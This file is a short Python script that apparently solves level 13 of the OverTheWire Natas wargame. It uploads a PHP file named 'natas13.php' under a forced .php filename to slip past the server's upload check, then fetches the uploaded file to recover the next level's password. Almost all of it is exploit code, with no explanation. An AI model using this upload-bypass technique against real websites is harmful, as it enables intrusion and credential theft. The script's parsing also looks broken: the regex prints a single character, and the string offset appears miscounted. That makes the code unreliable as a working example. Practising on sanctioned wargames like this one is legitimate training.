import re
import requests
from requests.auth import HTTPBasicAuth
import natas12solution

auth = HTTPBasicAuth('natas13', natas12solution.get_pass())
def get_pass():
    dat = {'filename':'sa439i6682.php'}
    f = {'uploadedfile': open('natas13.php', 'rb')}
    r = requests.post('http://natas13.natas.labs.overthewire.org/', auth=auth, files=f, data=dat)
    webcontent = r.text
    i = webcontent.find('The file <a href="upload/')+18
    url = 'http://natas13.natas.labs.overthewire.org/' + webcontent[i:i+21]
    r = requests.get(url, auth=auth)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
